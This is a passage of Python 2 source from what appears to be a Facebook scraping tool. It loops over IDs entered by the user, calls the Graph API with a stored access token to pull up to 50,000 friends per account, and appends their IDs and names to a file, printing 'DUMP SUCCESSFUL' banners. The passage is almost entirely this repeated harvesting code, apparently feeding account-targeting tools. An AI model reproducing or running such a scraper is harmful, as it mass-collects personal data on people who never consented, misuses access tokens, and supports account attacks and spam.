            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id57 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id57, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id58 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id58, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id59 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id59, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id60 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id60, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id61 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id61, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id62 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id62, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id63 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id63, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id64 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id64, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id65 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id65, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id66 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id66, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id67 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id67, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id68 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id68, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id69 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id69, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id70 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id70, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id71 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id71, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    id72 = raw_input('\x1b[1;92mENTER ID : ')
    
    try:
        rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id72, ___token___)).json()
        file1 = open(file, 'a')
        for a in rex['friends']['data']:
            file1.write(a['id'] + ' | ' + a['name'] + '\n')
            print '\x1b[1;92mDUMP SUCCESSFUL'
    except KeyError:
        print '\x1b[1;91mNot Public'

    print '\x1b[1;96m DUMP COMPLETED'
    time.sleep(5)
    menu()

Kashif()
